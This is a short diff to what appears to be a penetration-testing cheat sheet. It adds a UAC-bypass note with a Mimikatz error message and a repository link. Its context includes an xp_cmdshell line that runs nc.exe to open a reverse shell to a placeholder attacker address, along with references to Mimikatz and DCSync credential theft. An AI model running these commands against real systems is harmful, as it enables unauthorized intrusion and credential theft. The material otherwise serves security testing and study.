@@ -594,6 +594,16 @@ EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md
 
+- UAC-bypass
+
+If we are already in the administrators group but are unable to execute Mimikatz.
+
+```
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 non admin
+```
+
+https://github.com/k4sth4/UAC-bypass
+
 - DCSync
 
 ```powershell
